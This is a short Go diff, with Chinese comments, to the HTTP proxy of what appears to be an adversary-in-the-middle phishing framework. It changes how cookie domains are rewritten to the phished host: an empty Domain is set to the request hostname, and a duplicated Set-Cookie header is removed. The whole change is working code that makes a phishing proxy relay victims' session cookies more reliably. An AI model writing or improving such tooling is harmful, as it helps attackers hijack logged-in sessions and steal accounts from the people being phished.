@@ -1497,7 +1497,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 
-					ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+					// 如果 cookie 的 Domain 为空，设置为当前请求的 hostname
+					if ck.Domain == "" {
+						ck.Domain = req_hostname
+					} else {
+						ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
+					}
 					cookieStr := ck.String()
 					// 如果原始 cookie 包含 Partitioned 属性，追加到重新生成的 cookie 字符串
 					if hasPartitioned {
@@ -1505,9 +1510,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 					resp.Header.Add("Set-Cookie", cookieStr)
 				}
-			}
-			if ck.String() != "" {
-				resp.Header.Add("Set-Cookie", ck.String())
 			}
 
 			// modify received body
